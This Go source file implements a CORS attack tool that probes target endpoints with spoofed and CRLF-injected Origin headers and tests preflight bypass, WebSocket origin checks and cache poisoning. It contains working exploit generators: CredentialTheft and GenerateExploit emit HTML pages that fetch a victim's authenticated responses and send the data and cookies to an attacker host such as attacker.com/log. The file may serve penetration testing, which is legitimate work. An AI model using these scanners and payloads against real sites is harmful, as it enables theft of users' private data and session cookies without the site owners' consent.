package cors

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"
)

type CORSAttacker struct {
	TargetURL string
	Headers   map[string]string
	Client    *http.Client
	Results   []AttackResult
	RateLimit time.Duration
	mu        sync.Mutex
}

type AttackResult struct {
	Endpoint         string
	Origin           string
	AllowOrigin      string
	AllowCredentials string
	AllowMethods     string
	AllowHeaders     string
	ExposeHeaders    string
	Vulnerable       bool
	VulnType         string
	Severity         string
	Evidence         string
	Latency          time.Duration
}

func NewCORSAttacker(targetURL string) *CORSAttacker {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
	}

	return &CORSAttacker{
		TargetURL: strings.TrimSuffix(targetURL, "/"),
		Headers:   make(map[string]string),
		Client:    &http.Client{Transport: transport, Timeout: 30 * time.Second},
		Results:   make([]AttackResult, 0),
	}
}

func (c *CORSAttacker) Scan(endpoints []string, threads int) {
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, endpoint := range endpoints {
		wg.Add(1)
		go func(ep string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			c.testEndpoint(ep)
			time.Sleep(c.RateLimit)
		}(endpoint)
	}

	wg.Wait()
}

func (c *CORSAttacker) testEndpoint(endpoint string) {
	fullURL := c.TargetURL + endpoint

	targetParsed, _ := url.Parse(c.TargetURL)
	domain := targetParsed.Host

	origins := c.generateOrigins(domain)

	for _, origin := range origins {
		result := c.testOrigin(fullURL, origin)
		if result.Vulnerable {
			c.addResult(result)
		}
	}
}

func (c *CORSAttacker) generateOrigins(domain string) []string {
	parts := strings.Split(domain, ".")
	baseDomain := domain
	if len(parts) >= 2 {
		baseDomain = parts[len(parts)-2] + "." + parts[len(parts)-1]
	}

	return []string{
		"null",
		"https://evil.com",
		"http://evil.com",
		"https://attacker.com",
		fmt.Sprintf("https://%s.evil.com", baseDomain),
		fmt.Sprintf("https://evil.%s", baseDomain),
		fmt.Sprintf("https://%sevil.com", baseDomain),
		fmt.Sprintf("https://evil%s", baseDomain),
		fmt.Sprintf("https://%s.attacker.com", domain),
		fmt.Sprintf("https://sub.%s", domain),
		fmt.Sprintf("http://%s", domain),
		fmt.Sprintf("https://%s%%60attacker.com", baseDomain),
		fmt.Sprintf("https://%s%%0d%%0aevil.com", baseDomain),
		"https://localhost",
		"http://localhost",
		"https://127.0.0.1",
		"file://",
		"https://[::1]",
		fmt.Sprintf("https://%s#evil.com", domain),
		fmt.Sprintf("https://%s?evil.com", domain),
		fmt.Sprintf("https://%s/evil.com", domain),
		fmt.Sprintf("https://evil.com/.%s", domain),
		fmt.Sprintf("https://evil.com/redirect?url=https://%s", domain),
	}
}

func (c *CORSAttacker) testOrigin(targetURL, origin string) AttackResult {
	req, err := http.NewRequest("OPTIONS", targetURL, nil)
	if err != nil {
		return AttackResult{}
	}

	req.Header.Set("Origin", origin)
	req.Header.Set("Access-Control-Request-Method", "GET, POST, PUT, DELETE")
	req.Header.Set("Access-Control-Request-Headers", "X-Custom-Header, Authorization, Content-Type")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	for k, v := range c.Headers {
		req.Header.Set(k, v)
	}

	start := time.Now()
	resp, err := c.Client.Do(req)
	latency := time.Since(start)

	if err != nil {
		return AttackResult{}
	}
	defer resp.Body.Close()

	allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
	allowCreds := resp.Header.Get("Access-Control-Allow-Credentials")
	allowMethods := resp.Header.Get("Access-Control-Allow-Methods")
	allowHeaders := resp.Header.Get("Access-Control-Allow-Headers")
	exposeHeaders := resp.Header.Get("Access-Control-Expose-Headers")

	result := AttackResult{
		Endpoint:         targetURL,
		Origin:           origin,
		AllowOrigin:      allowOrigin,
		AllowCredentials: allowCreds,
		AllowMethods:     allowMethods,
		AllowHeaders:     allowHeaders,
		ExposeHeaders:    exposeHeaders,
		Latency:          latency,
	}

	// Check vulnerabilities
	if allowOrigin == "*" && allowCreds == "true" {
		result.Vulnerable = true
		result.VulnType = "Wildcard with Credentials"
		result.Severity = "Critical"
		result.Evidence = "ACAO: * with credentials=true (browser blocks but misconfigured)"
		fmt.Printf("[!] Critical: %s - Wildcard with credentials\n", targetURL)
	} else if allowOrigin == origin && origin != "" {
		if allowCreds == "true" {
			result.Vulnerable = true
			result.VulnType = "Origin Reflection with Credentials"
			result.Severity = "Critical"
			result.Evidence = fmt.Sprintf("Reflects %s with credentials", origin)
			fmt.Printf("[!] Critical: %s reflects %s with creds\n", targetURL, origin)
		} else {
			result.Vulnerable = true
			result.VulnType = "Origin Reflection"
			result.Severity = "High"
			result.Evidence = fmt.Sprintf("Reflects arbitrary origin: %s", origin)
			fmt.Printf("[!] High: %s reflects %s\n", targetURL, origin)
		}
	} else if allowOrigin == "null" {
		result.Vulnerable = true
		result.VulnType = "Null Origin Allowed"
		result.Severity = "High"
		result.Evidence = "Allows null origin (sandbox/data URI exploit)"
		fmt.Printf("[!] High: %s allows null origin\n", targetURL)
	} else if allowOrigin == "*" {
		result.Vulnerable = true
		result.VulnType = "Wildcard Origin"
		result.Severity = "Medium"
		result.Evidence = "Allows any origin (no credentials)"
		fmt.Printf("[+] Medium: %s allows wildcard\n", targetURL)
	} else if c.isSubdomainMatch(origin, allowOrigin) {
		result.Vulnerable = true
		result.VulnType = "Subdomain Takeover Risk"
		result.Severity = "Medium"
		result.Evidence = fmt.Sprintf("Trusts subdomains: %s", allowOrigin)
		fmt.Printf("[+] Medium: %s trusts subdomains\n", targetURL)
	}

	return result
}

func (c *CORSAttacker) isSubdomainMatch(origin, allowOrigin string) bool {
	if allowOrigin == "" {
		return false
	}
	originParsed, _ := url.Parse(origin)
	if originParsed == nil {
		return false
	}
	return strings.Contains(allowOrigin, originParsed.Host)
}

func (c *CORSAttacker) CredentialTheft(targetURL, maliciousOrigin string) string {
	poc := fmt.Sprintf(`<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h1>CORS Credential Theft PoC</h1>
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '%s', true);
xhr.withCredentials = true;
xhr.onreadystatechange = function() {
    if (xhr.readyState === 4) {
        console.log('Response:', xhr.responseText);
        // Exfiltrate to attacker
        var exfil = new XMLHttpRequest();
        exfil.open('POST', '%s/collect', true);
        exfil.send(JSON.stringify({
            url: '%s',
            data: xhr.responseText,
            cookies: document.cookie
        }));
    }
};
xhr.send();
</script>
<p>If you see data in console, CORS is exploitable.</p>
</body>
</html>`, targetURL, maliciousOrigin, targetURL)

	return poc
}

func (c *CORSAttacker) PreflightBypass(targetURL string) {
	methods := []string{"GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD", "TRACE", "CONNECT"}
	contentTypes := []string{
		"text/plain",
		"application/x-www-form-urlencoded",
		"multipart/form-data",
		"text/plain; charset=utf-8",
		"application/json",
	}

	for _, method := range methods {
		for _, ct := range contentTypes {
			req, _ := http.NewRequest(method, targetURL, nil)
			req.Header.Set("Origin", "https://evil.com")
			req.Header.Set("Content-Type", ct)

			resp, err := c.Client.Do(req)
			if err != nil {
				continue
			}

			allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
			resp.Body.Close()

			if allowOrigin == "https://evil.com" || allowOrigin == "*" {
				c.addResult(AttackResult{
					Endpoint:    targetURL,
					Origin:      "https://evil.com",
					AllowOrigin: allowOrigin,
					Vulnerable:  true,
					VulnType:    "Preflight Bypass",
					Severity:    "High",
					Evidence:    fmt.Sprintf("Method %s with %s bypasses preflight", method, ct),
				})
				fmt.Printf("[!] Preflight bypass: %s %s\n", method, ct)
			}
		}
	}
}

func (c *CORSAttacker) WebSocketCORS(wsURL string) {
	origins := []string{
		"https://evil.com",
		"http://evil.com",
		"null",
		"file://",
	}

	for _, origin := range origins {
		req, _ := http.NewRequest("GET", wsURL, nil)
		req.Header.Set("Origin", origin)
		req.Header.Set("Upgrade", "websocket")
		req.Header.Set("Connection", "Upgrade")
		req.Header.Set("Sec-WebSocket-Version", "13")
		req.Header.Set("Sec-WebSocket-Key", "dGhlIHNhbXBsZSBub25jZQ==")

		resp, err := c.Client.Do(req)
		if err != nil {
			continue
		}

		if resp.StatusCode == 101 || resp.StatusCode == 200 {
			c.addResult(AttackResult{
				Endpoint:   wsURL,
				Origin:     origin,
				Vulnerable: true,
				VulnType:   "WebSocket CORS Bypass",
				Severity:   "High",
				Evidence:   fmt.Sprintf("WebSocket accepts origin: %s", origin),
			})
			fmt.Printf("[!] WebSocket CORS: %s accepts %s\n", wsURL, origin)
		}
		resp.Body.Close()
	}
}

func (c *CORSAttacker) HeaderInjection(targetURL string) {
	injections := []struct {
		origin string
		desc   string
	}{
		{"https://evil.com\r\nX-Injected: true", "CRLF Injection"},
		{"https://evil.com%0d%0aX-Injected:%20true", "URL Encoded CRLF"},
		{"https://evil.com\nX-Injected: true", "LF Injection"},
		{"https://evil.com\rX-Injected: true", "CR Injection"},
		{"https://evil.com%00", "Null Byte"},
		{"https://evil.com%20", "Space Injection"},
	}

	for _, inj := range injections {
		req, _ := http.NewRequest("OPTIONS", targetURL, nil)
		req.Header.Set("Origin", inj.origin)

		resp, err := c.Client.Do(req)
		if err != nil {
			continue
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if resp.Header.Get("X-Injected") != "" || strings.Contains(string(body), "X-Injected") {
			c.addResult(AttackResult{
				Endpoint:   targetURL,
				Origin:     inj.origin,
				Vulnerable: true,
				VulnType:   "CORS Header Injection",
				Severity:   "Critical",
				Evidence:   inj.desc,
			})
			fmt.Printf("[!] Header Injection: %s\n", inj.desc)
		}
	}
}

func (c *CORSAttacker) CachePoison(targetURL string) {
	origins := []string{"https://evil.com", "https://attacker.com"}

	for _, origin := range origins {
		req, _ := http.NewRequest("GET", targetURL, nil)
		req.Header.Set("Origin", origin)

		resp, err := c.Client.Do(req)
		if err != nil {
			continue
		}

		cacheControl := resp.Header.Get("Cache-Control")
		vary := resp.Header.Get("Vary")
		allowOrigin := resp.Header.Get("Access-Control-Allow-Origin")
		resp.Body.Close()

		if allowOrigin != "" && !strings.Contains(vary, "Origin") {
			if !strings.Contains(cacheControl, "no-store") && !strings.Contains(cacheControl, "private") {
				c.addResult(AttackResult{
					Endpoint:    targetURL,
					Origin:      origin,
					AllowOrigin: allowOrigin,
					Vulnerable:  true,
					VulnType:    "CORS Cache Poisoning",
					Severity:    "High",
					Evidence:    "Cacheable response without Vary: Origin",
				})
				fmt.Printf("[!] Cache Poison risk: %s\n", targetURL)
			}
		}
	}
}

func (c *CORSAttacker) FullScan(endpoints []string, threads int) {
	sem := make(chan struct{}, threads)
	var wg sync.WaitGroup

	for _, endpoint := range endpoints {
		wg.Add(1)
		go func(ep string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()

			fullURL := c.TargetURL + ep
			c.testEndpoint(ep)
			c.PreflightBypass(fullURL)
			c.HeaderInjection(fullURL)
			c.CachePoison(fullURL)

			time.Sleep(c.RateLimit)
		}(endpoint)
	}

	wg.Wait()
}

func (c *CORSAttacker) GenerateExploit(result AttackResult) string {
	return fmt.Sprintf(`<!-- CORS Exploit for %s -->
<!DOCTYPE html>
<html>
<head><title>CORS Exploit</title></head>
<body>
<script>
fetch('%s', {
    method: 'GET',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'}
})
.then(response => response.text())
.then(data => {
    console.log('Stolen data:', data);
    navigator.sendBeacon('https://attacker.com/log', data);
})
.catch(err => console.error(err));
</script>
</body>
</html>`, result.Endpoint, result.Endpoint)
}

func (c *CORSAttacker) addResult(result AttackResult) {
	c.mu.Lock()
	defer c.mu.Unlock()
	c.Results = append(c.Results, result)
}

func (c *CORSAttacker) GetVulnerabilities() []AttackResult {
	var vulns []AttackResult
	for _, r := range c.Results {
		if r.Vulnerable {
			vulns = append(vulns, r)
		}
	}
	return vulns
}

func (c *CORSAttacker) ExportResults() string {
	data, _ := json.MarshalIndent(c.Results, "", "  ")
	return string(data)
}
